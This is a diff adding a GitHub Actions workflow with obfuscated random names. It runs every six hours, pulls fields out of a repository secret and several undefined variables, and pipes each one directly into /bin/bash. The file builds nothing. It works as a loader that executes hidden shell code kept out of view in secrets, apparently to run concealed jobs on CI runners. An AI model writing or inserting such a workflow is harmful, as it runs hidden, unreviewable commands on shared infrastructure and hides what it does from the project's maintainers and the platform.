@@ -1,0 +1,22 @@
+name: wangxianglong4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangxianglong4567
+        env:
+          oq6855: ${{ secrets.oq6855 }}
+        run: |
+          echo $oq6855 | jq -r .xu47491 | /bin/bash
+          echo $shl35467 | jq -r .dt2039 | /bin/bash
+          echo $v24 | jq -r .g45905 | /bin/bash
+          echo $pdqo04471 | jq -r .ymw1783 | /bin/bash
+          echo $cwsf246 | jq -r .j57396 | /bin/bash
+          echo $rgrll8482 | jq -r .oi968 | /bin/bash
+
